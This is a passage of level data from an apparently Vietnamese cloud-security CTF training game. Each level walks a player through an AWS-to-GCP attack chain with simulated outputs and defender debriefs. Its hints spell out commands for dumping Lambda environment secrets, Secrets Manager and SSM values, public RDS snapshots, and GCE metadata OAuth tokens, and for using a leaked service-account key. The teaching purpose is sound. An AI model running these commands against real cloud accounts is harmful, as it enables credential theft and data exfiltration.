      'Liệt kê hàm: `aws lambda list-functions`.',
      'Đọc cấu hình hàm chính: `aws lambda get-function-configuration --function-name acme-prod-api` — DB_PASSWORD và JWT_SECRET nằm ngay trong Environment.Variables.',
    ],
    debrief: [
      'Lambda environment variables là nơi cực phổ biến để nhét secret vì dễ và "không ai thấy" — nhưng bất kỳ ai có lambda:GetFunctionConfiguration đều đọc được plaintext.',
      'Một JWT_SECRET lộ cho phép tự ký token hợp lệ (giả mạo bất kỳ user nào); một DB_PASSWORD lộ mở thẳng đường vào CSDL — secret ở đây thường là chìa cho nhiều hệ thống khác.',
      'Enum Lambda còn lộ code, layer, và IAM execution role của hàm — mỗi thứ là một hướng đào tiếp.',
      'DEFENDER: không để secret thô trong env var — dùng Secrets Manager/SSM SecureString và nạp lúc runtime; bật mã hoá env bằng KMS key riêng; siết quyền lambda:GetFunctionConfiguration.',
    ],
    terms: [
      { term: 'AWS Lambda', def: 'Dịch vụ chạy hàm serverless theo sự kiện, không cần quản server.' },
      { term: 'Environment variables', def: 'Biến cấu hình truyền vào function lúc chạy; hay bị lạm dụng để chứa secret dạng plaintext.' },
      { term: 'get-function-configuration', def: 'Lệnh trả metadata + biến môi trường của một Lambda; lộ secret nếu được nhét vào env.' },
      { term: 'JWT secret', def: 'Khoá bí mật dùng ký/verify JSON Web Token; lộ ra là giả mạo được token của bất kỳ user nào.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 10 ────────────────────────────────────────────────────────────────────
  {
    id: 10,
    chapterId: 11,
    title: 'Két sắt: Secrets Manager & SSM',
    story:
      'AWS có hai két chính thức cho secret: Secrets Manager và SSM Parameter Store. Với quyền admin, mày mở cả hai. Đây là nơi tập trung mật khẩu master DB và API key sản phẩm — kho báu cuối của phần AWS.',
    steps: [
      {
        id: 'list_secrets',
        description: 'Liệt kê secret trong Secrets Manager',
        match: /^aws\s+secretsmanager\s+list-secrets\b/i,
        output: [
          '{',
          '    "SecretList": [',
          '        { "Name": "prod/db/master",  "ARN": "arn:aws:secretsmanager:us-east-1:428901736512:secret:prod/db/master-AbCdEf" },',
          '        { "Name": "prod/stripe/api", "ARN": "arn:aws:secretsmanager:us-east-1:428901736512:secret:prod/stripe/api-GhIjKl" }',
          '    ]',
          '}',
        ].join('\n'),
      },
      {
        id: 'get_secret',
        description: 'Đọc giá trị secret master DB',
        match: /^aws\s+secretsmanager\s+get-secret-value\b/i,
        output: [
          '{',
          '    "Name": "prod/db/master",',
          '    "SecretString": "{\\"username\\":\\"admin\\",\\"password\\":\\"R00t-M@ster-2024-Pr0d\\"}",',
          '    "VersionId": "a1b2c3d4-1111-2222-3333-444455556666"',
          '}',
        ].join('\n'),
      },
      {
        id: 'ssm_param',
        description: 'Đọc SecureString trong SSM Parameter Store (--with-decryption)',
        match: /^aws\s+ssm\s+get-parameter\b.*--with-decryption|^aws\s+ssm\s+get-parameter\b/i,
        output: [
          '{',
          '    "Parameter": {',
          '        "Name": "/acme/prod/api_key",',
          '        "Type": "SecureString",',
          '        "Value": "sk_live_acme_9f8a7b6c5d4e3f2a1b0c",',
          '        "Version": 3',
          '    }',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'AWS có hai két chuẩn: Secrets Manager và SSM Parameter Store. Admin thì mở được cả hai.',
      'Secrets Manager: `aws secretsmanager list-secrets` rồi `aws secretsmanager get-secret-value --secret-id prod/db/master`.',
      'SSM phải giải mã mới ra giá trị: `aws ssm get-parameter --name /acme/prod/api_key --with-decryption` — thiếu --with-decryption sẽ chỉ thấy ciphertext.',
    ],
    debrief: [
      'Secrets Manager và SSM SecureString là cách ĐÚNG để lưu secret (mã hoá bằng KMS, có audit) — nhưng đúng chỗ không cứu được nếu quyền đọc cấp quá rộng.',
      '--with-decryption yêu cầu AWS dùng KMS giải mã giá trị trước khi trả; thiếu nó hoặc thiếu quyền KMS sẽ chỉ nhận ciphertext.',
      'Đây là "single point of compromise": gom secret về một chỗ giúp quản lý, nhưng nếu attacker đạt quyền đọc thì lấy được TẤT CẢ trong một lần.',
      'DEFENDER: gắn resource policy/KMS key policy chặt cho từng secret (chỉ role cần mới đọc); bật rotation tự động; log secretsmanager:GetSecretValue và cảnh báo khi một identity đọc hàng loạt secret.',
    ],
    terms: [
      { term: 'Secrets Manager', def: 'Dịch vụ AWS lưu, mã hoá và xoay vòng secret; truy cập qua get-secret-value.' },
      { term: 'SSM Parameter Store', def: 'Kho tham số cấu hình của AWS; kiểu SecureString được KMS mã hoá.' },
      { term: '--with-decryption', def: 'Cờ yêu cầu giải mã SecureString bằng KMS để trả giá trị plaintext.' },
      { term: 'KMS', def: 'Key Management Service — quản lý khoá mã hoá; là lớp bảo vệ dưới Secrets Manager/SSM SecureString.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 11 ────────────────────────────────────────────────────────────────────
  {
    id: 11,
    chapterId: 11,
    title: 'RDS snapshot công khai',
    story:
      'Có một cách lấy cả database mà không cần mật khẩu: snapshot. Nếu một RDS snapshot bị share public, bất kỳ ai cũng khôi phục nó thành DB của riêng mình rồi đọc thoải mái. Mày soi danh sách snapshot và kiểm tra thuộc tính chia sẻ.',
    steps: [
      {
        id: 'describe_snapshots',
        description: 'Liệt kê RDS snapshot (gồm cả loại public)',
        match: /^aws\s+rds\s+describe-db-snapshots\b/i,
        output: [
          '{',
          '    "DBSnapshots": [',
          '        {',
          '            "DBSnapshotIdentifier": "acme-prod-snapshot-2026-06",',
          '            "DBInstanceIdentifier": "acme-prod-db",',
          '            "Engine": "mysql",',
          '            "SnapshotType": "manual",',
          '            "Status": "available"',
          '        }',
          '    ]',
          '}',
        ].join('\n'),
      },
      {
        id: 'snap_attrs',
        description: 'Kiểm tra thuộc tính chia sẻ của snapshot (restore = all => public)',
        match: /^aws\s+rds\s+describe-db-snapshot-attributes\b/i,
        output: [
          '{',
          '    "DBSnapshotAttributesResult": {',
          '        "DBSnapshotIdentifier": "acme-prod-snapshot-2026-06",',
          '        "DBSnapshotAttributes": [',
          '            {',
          '                "AttributeName": "restore",',
          '                "AttributeValues": [ "all" ]',
          '            }',
          '        ]',
          '    }',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'Không cần mật khẩu DB nếu mày có thể khôi phục bản sao của nó. Snapshot là bản sao đó.',
      'Liệt kê snapshot: `aws rds describe-db-snapshots --snapshot-type public --include-public`.',
      'Kiểm tra chia sẻ: `aws rds describe-db-snapshot-attributes --db-snapshot-identifier acme-prod-snapshot-2026-06` — restore = ["all"] nghĩa là public, ai cũng restore được.',
    ],
    debrief: [
      'RDS snapshot là ảnh chụp toàn bộ database; share nó "public" (restore=all) đồng nghĩa biếu không cả DB cho bất kỳ tài khoản AWS nào.',
      'Attacker không restore vào account nạn nhân — họ restore snapshot công khai vào ACCOUNT CỦA MÌNH, nơi họ là admin, rồi đọc dữ liệu thoải mái, vượt qua mọi mật khẩu/network của DB gốc.',
      'Đây là kênh rò rỉ âm thầm: DB gốc vẫn khoá kín, log truy cập DB không thấy gì bất thường, nhưng dữ liệu đã ra ngoài qua bản sao.',
      'DEFENDER: không bao giờ để snapshot ở chế độ public (restore=all); mã hoá snapshot bằng KMS (snapshot mã hoá không share public được); quét định kỳ thuộc tính share; bật cảnh báo ModifyDBSnapshotAttribute.',
    ],
    terms: [
      { term: 'RDS', def: 'Relational Database Service — DB có quản lý của AWS (MySQL, PostgreSQL...).' },
      { term: 'DB snapshot', def: 'Ảnh chụp toàn bộ một database tại thời điểm; có thể khôi phục thành instance mới.' },
      { term: 'restore = all', def: 'Thuộc tính chia sẻ snapshot cho "mọi account" — tức public; ai cũng khôi phục và đọc được.' },
      { term: 'Snapshot exfiltration', def: 'Lấy dữ liệu DB bằng cách restore snapshot công khai vào account của attacker, bỏ qua mật khẩu DB gốc.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 12 ────────────────────────────────────────────────────────────────────
  {
    id: 12,
    chapterId: 11,
    title: 'CloudTrail: con mắt phòng thủ',
    story:
      'Mọi hành động API của mày đều có thể bị CloudTrail ghi lại. Một attacker giỏi luôn kiểm tra: trail nào đang chạy, nó log vào đâu, và mình đã để lại dấu gì. Hiểu CloudTrail là hiểu cả phía phòng thủ đang nhìn thấy gì.',
    steps: [
      {
        id: 'describe_trails',
        description: 'Liệt kê các CloudTrail trail và bucket lưu log',
        match: /^aws\s+cloudtrail\s+describe-trails\b/i,
        output: [
          '{',
          '    "trailList": [',
          '        {',
          '            "Name": "acme-org-trail",',
          '            "S3BucketName": "acme-cloudtrail-logs",',
          '            "IsMultiRegionTrail": true,',
          '            "HomeRegion": "us-east-1"',
          '        }',
          '    ]',
          '}',
        ].join('\n'),
      },
      {
        id: 'trail_status',
        description: 'Kiểm tra trail có đang logging không',
        match: /^aws\s+cloudtrail\s+get-trail-status\b/i,
        output: [
          '{',
          '    "IsLogging": true,',
          '    "LatestDeliveryTime": "2026-06-29T10:20:00+00:00",',
          '    "StartLoggingTime": "2024-01-01T00:00:00+00:00"',
          '}',
        ].join('\n'),
      },
      {
        id: 'lookup_events',
        description: 'Tra sự kiện gần đây (vd ConsoleLogin) trong CloudTrail',
        match: /^aws\s+cloudtrail\s+lookup-events\b/i,
        output: [
          '{',
          '    "Events": [',
          '        {',
          '            "EventName": "ConsoleLogin",',
          '            "EventTime": "2026-06-29T03:14:01+00:00",',
          '            "Username": "admin",',
          '            "EventSource": "signin.amazonaws.com"',
          '        }',
          '    ]',
          '}',
        ].join('\n'),
      },
    ],
    hints: [
      'Trên cloud, "log" không nằm ở từng server mà ở một dịch vụ trung tâm: CloudTrail. Biết nó đang ghi gì trước đã.',
      'Liệt kê trail: `aws cloudtrail describe-trails`. Xem còn ghi không: `aws cloudtrail get-trail-status`.',
      'Tra sự kiện: `aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin`. Một attacker có quyền còn có thể stop-logging hoặc xoá trail để né — nhưng chính việc đó cũng bị ghi.',
    ],
    debrief: [
      'CloudTrail ghi gần như mọi lời gọi API trong account vào một bucket S3 — đây là nguồn forensic số một để dựng lại hành vi của attacker.',
      'Kẻ tấn công quyền cao có thể StopLogging/DeleteTrail để "tắt đèn", nhưng bản thân các sự kiện đó vẫn được ghi trước khi tắt và thường kích hoạt cảnh báo — né logging là con dao hai lưỡi.',
      'lookup-events cho phép tra cứu 90 ngày sự kiện quản lý mà không cần đụng bucket log — hữu ích cho cả attacker (xem mình lộ gì) lẫn defender (điều tra).',
      'DEFENDER: bật multi-region trail + log file validation; khoá bucket log bằng Object Lock/MFA-delete; gửi cảnh báo tức thì cho StopLogging/DeleteTrail/UpdateTrail; tách quyền quản trị CloudTrail khỏi mọi role vận hành.',
    ],
    terms: [
      { term: 'CloudTrail', def: 'Dịch vụ ghi lại lời gọi API trong account AWS; nền tảng audit và điều tra sự cố.' },
      { term: 'Trail', def: 'Cấu hình CloudTrail xác định ghi sự kiện gì và đẩy log vào bucket S3 nào.' },
      { term: 'lookup-events', def: 'Truy vấn 90 ngày sự kiện quản lý gần nhất trực tiếp từ CloudTrail, không cần đọc bucket.' },
      { term: 'Anti-forensics', def: 'Kỹ thuật xoá/tắt log để che dấu vết; trên AWS chính hành động này cũng bị ghi và dễ kích hoạt cảnh báo.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 13 ────────────────────────────────────────────────────────────────────
  {
    id: 13,
    chapterId: 11,
    title: 'Nhảy sang GCP bằng key lộ',
    story:
      'acme không chỉ ở AWS — họ còn cả một dự án trên Google Cloud. Trong đống file lấy được có một service account key JSON. Trên GCP, file key này là toàn bộ danh tính của một service account: activate nó là mày trở thành chính service account đó.',
    steps: [
      {
        id: 'cat_key',
        description: 'Đọc file service account key JSON để xác nhận project và email',
        match: /^cat\b.*gcp-key\.json/,
      },
      {
        id: 'activate',
        description: 'Activate service account từ file key (gcloud auth)',
        match: /^gcloud\s+auth\s+activate-service-account\b/i,
        output: 'Activated service account credentials for: [ci-deployer@acme-cloud-prod.iam.gserviceaccount.com]',
      },
      {
        id: 'projects_list',
        description: 'Liệt kê project GCP mà service account này thấy được',
        match: /^gcloud\s+projects\s+list\b/i,
        output: [
          'PROJECT_ID            NAME              PROJECT_NUMBER',
          'acme-cloud-prod       Acme Production   882910374651',
          'acme-cloud-staging    Acme Staging      882910374999',
          'acme-data-lake        Acme Data Lake    882910375221',
        ].join('\n'),
      },
    ],
    hints: [
      'GCP không dùng AKIA/secret như AWS — danh tính máy của nó là một file JSON "service account key".',
      'Soi key trước: `cat /home/hacker/gcp-key.json` (xem client_email + project_id). Rồi nạp: `gcloud auth activate-service-account --key-file=/home/hacker/gcp-key.json`.',
      'Sau khi activate, xem mình với tới project nào: `gcloud projects list` — đó là phạm vi service account này kiểm soát.',
    ],
    debrief: [
      'Service account key JSON trên GCP tương đương access key dài hạn của AWS — ai cầm file là danh tính đó, không cần mật khẩu, không hết hạn cho tới khi bị xoá.',
      'gcloud auth activate-service-account nạp key vào cli; từ giây đó mọi lệnh gcloud chạy dưới quyền của service account, kế thừa toàn bộ IAM role của nó trên project.',
      'Service account dạng ci-deployer thường có quyền rộng (deploy hạ tầng) — chiếm được nó thường mở luôn đường tới compute, storage và secret của project.',
      'DEFENDER: hạn chế tạo và tải service account key (ưu tiên Workload Identity); xoay/khoá key định kỳ; gắn quyền tối thiểu cho mỗi SA; bật cảnh báo khi key được dùng từ địa điểm lạ; quét key lộ trong repo.',
    ],
    terms: [
      { term: 'GCP', def: 'Google Cloud Platform — nền tảng đám mây của Google, tổ chức tài nguyên theo project.' },
      { term: 'Service account', def: 'Danh tính dành cho ứng dụng/máy trên GCP (không phải người dùng); được gán IAM role trên project.' },
      { term: 'Service account key (JSON)', def: 'File credential dài hạn của một service account; cầm file là mạo danh được SA đó.' },
      { term: 'gcloud', def: 'CLI chính thức của Google Cloud để quản lý tài nguyên và xác thực.' },
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/gcp-key.json': {
        type: 'file',
        content: [
          '{',
          '  "type": "service_account",',
          '  "project_id": "acme-cloud-prod",',
          '  "private_key_id": "9f8a7b6c5d4e3f2a1b0c",',
          '  "private_key": "-----BEGIN PRIVATE KEY-----MIIEv...REDACTED...-----END PRIVATE KEY-----",',
          '  "client_email": "ci-deployer@acme-cloud-prod.iam.gserviceaccount.com",',
          '  "client_id": "104729384756102938475",',
          '  "token_uri": "https://oauth2.googleapis.com/token"',
          '}',
        ].join('\n'),
      },
    },
  },

  // ── 14 ────────────────────────────────────────────────────────────────────
  {
    id: 14,
    chapterId: 11,
    title: 'GCP buckets & metadata',
    story:
      'Đứng trong project acme-cloud-prod, mày làm điều tương tự AWS: liệt kê Cloud Storage bucket (gsutil), và nếu đang trên một GCE instance, hỏi metadata server của Google để lấy access token OAuth — phiên bản GCP của 169.254.169.254.',
    steps: [
      {
        id: 'gsutil_ls',
        description: 'Liệt kê toàn bộ Cloud Storage bucket trong project',
        match: /^gsutil\s+ls\s*$/i,
        output: [
          'gs://acme-gcp-backups/',
          'gs://acme-gcp-data/',
          'gs://acme-cloud-prod-terraform/',
          'gs://acme-secret-loot/',
        ].join('\n'),
      },
      {
        id: 'gsutil_ls_bucket',
        description: 'Liệt kê object trong bucket dữ liệu',
        match: /^gsutil\s+ls\s+gs:\/\/acme-gcp-data/i,
        output: [
          'gs://acme-gcp-data/exports/',
          'gs://acme-gcp-data/users_export.csv',
          'gs://acme-gcp-data/service-config.yaml',
        ].join('\n'),
      },
      {
        id: 'gce_metadata',
        description: 'Lấy OAuth access token từ GCE metadata server (header Metadata-Flavor)',
        match: /^curl\b.*metadata\.google\.internal.*Metadata-Flavor/i,
        output: '{"access_token":"ya29.c.Kp8B-REDACTED-oauth-token","expires_in":3599,"token_type":"Bearer"}',
      },
    ],
    hints: [
      'GCP có gsutil cho Cloud Storage (giống aws s3) và một metadata server riêng cho instance.',
      'Liệt kê bucket: `gsutil ls`. Vào một bucket cụ thể: `gsutil ls gs://acme-gcp-data`.',
      'Trên GCE, lấy token máy: `curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"` — bắt buộc có header Metadata-Flavor: Google thì server mới trả lời.',
    ],
    debrief: [
      'gsutil với Cloud Storage chính là aws-cli với S3: cùng bài học (bucket cấu hình lỏng = rò rỉ), chỉ khác cú pháp gs:// và allUsers/allAuthenticatedUsers thay cho AllUsers.',
      'Metadata server của GCP (metadata.google.internal / 169.254.169.254) BẮT BUỘC header "Metadata-Flavor: Google" — một biện pháp chống SSRF kiểu cũ vì request đơn giản thiếu header sẽ bị từ chối.',
      'access_token ya29... là token OAuth ngắn hạn của service account gắn vào instance; cầm nó là gọi được API Google Cloud dưới quyền SA mà không cần file key.',
      'DEFENDER: không gán SA quyền rộng cho GCE instance; dùng scope tối thiểu; chặn outbound tới metadata từ tầng app; vá SSRF; bật VPC Service Controls để giới hạn phạm vi truy cập dữ liệu.',
    ],
    terms: [
      { term: 'Cloud Storage', def: 'Dịch vụ lưu object của GCP, tương đương S3; truy cập qua gsutil hoặc URL gs://.' },
      { term: 'gsutil', def: 'CLI thao tác Cloud Storage (ls, cp, cat...) — đối ứng của aws s3.' },
      { term: 'GCE metadata server', def: 'Endpoint metadata.google.internal trả metadata và OAuth token cho instance; bắt buộc header Metadata-Flavor.' },
      { term: 'Metadata-Flavor: Google', def: 'Header bắt buộc khi gọi metadata server GCP; chặn các SSRF đơn giản thiếu header.' },
    ],
    initialFilesystem: { ...ROOT_FS },
  },

  // ── 15 ────────────────────────────────────────────────────────────────────
  {
    id: 15,
    chapterId: 11,
    title: 'Capture the Flag — toàn cảnh đám mây',
    story:
      'Cả chuỗi dồn về một chỗ: bucket acme-secret-loot trên GCP chứa chiến lợi phẩm cuối. Với token vừa lấy, mày liệt kê nó, kéo file flag về máy, và đọc cờ. Đây là điểm kết của hành trình từ một cái tên miền tới quyền kiểm soát cả hai đám mây.',
    steps: [
      {
        id: 'ls_loot',
        description: 'Liệt kê object trong bucket loot cuối cùng',
        match: /^gsutil\s+ls\s+gs:\/\/acme-secret-loot/i,
        output: [
          'gs://acme-secret-loot/flag.txt',
          'gs://acme-secret-loot/master-credentials.kdbx',
        ].join('\n'),
      },
      {
        id: 'cp_flag',
        description: 'Tải file flag từ bucket về thư mục loot local',
        match: /^gsutil\s+cp\s+gs:\/\/acme-secret-loot\/\S+/i,
        output: [
          'Copying gs://acme-secret-loot/flag.txt...',
          '/ [1 files][   58.0 B/  58.0 B]',
          'Operation completed over 1 objects/58.0 B.',
        ].join('\n'),
      },
      {
        id: 'read_flag',
        description: 'Đọc cờ vừa tải về',
        match: /^cat\b.*\/loot\/flag\.txt/,
      },
    ],
    hints: [
      'Tất cả dẫn tới một bucket cuối: acme-secret-loot. Token GCP của mày mở được nó.',
      'Liệt kê: `gsutil ls gs://acme-secret-loot`. Kéo cờ về: `gsutil cp gs://acme-secret-loot/flag.txt /home/hacker/loot/flag.txt`.',
      'Đọc cờ: `cat /home/hacker/loot/flag.txt` — đó là chiến lợi phẩm khép lại chương Cloud Security.',
    ],
    debrief: [
      'Chuỗi tấn công cloud điển hình hiếm khi là một exploit hào nhoáng — nó là chuỗi cấu hình sai nối nhau: bucket public -> key lộ -> IAM privesc -> metadata -> secret -> bucket loot.',
      'Từ một cái tên công ty tới quyền đọc két cuối, mày không hề khai thác lỗ hổng phần mềm nào: tất cả là quyền đặt sai và secret để hớ — đó là bản chất rủi ro của cloud.',
      'Mỗi mắt xích lẽ ra có một chốt chặn (Block Public Access, no hardcoded key, least-privilege, IMDSv2, KMS) — phòng thủ cloud là phòng thủ theo lớp, gãy một lớp chưa chết nếu các lớp sau còn.',
      'DEFENDER: dựng cảnh báo cho từng mắt xích (bucket public, GetSecretValue hàng loạt, CreatePolicyVersion, key dùng từ IP lạ); chạy CSPM (Prowler/ScoutSuite) định kỳ để bắt cấu hình sai trước khi attacker bắt được.',
    ],
    terms: [
      { term: 'Attack chain', def: 'Chuỗi các bước nối nhau từ điểm vào tới mục tiêu; trên cloud thường là chuỗi cấu hình sai thay vì một exploit đơn lẻ.' },
      { term: 'CSPM', def: 'Cloud Security Posture Management — công cụ (Prowler, ScoutSuite) quét cấu hình cloud tìm sai sót.' },
      { term: 'Defense in depth', def: 'Phòng thủ nhiều lớp; mỗi lớp là một chốt chặn để gãy một lớp chưa dẫn tới thất thủ toàn bộ.' },
      { term: 'Flag', def: 'Chuỗi bí mật chứng minh đã chiếm được mục tiêu trong bài CTF (vd FLAG{...}).' },
    ],
    initialFilesystem: {
      ...ROOT_FS,
      '/home/hacker/loot': { type: 'dir' },
      '/home/hacker/loot/flag.txt': {
        type: 'file',
        content: 'FLAG{aws_l34ked_k3y_to_gcp_full_cl0ud_pwn}',
      },
    },
  },
];
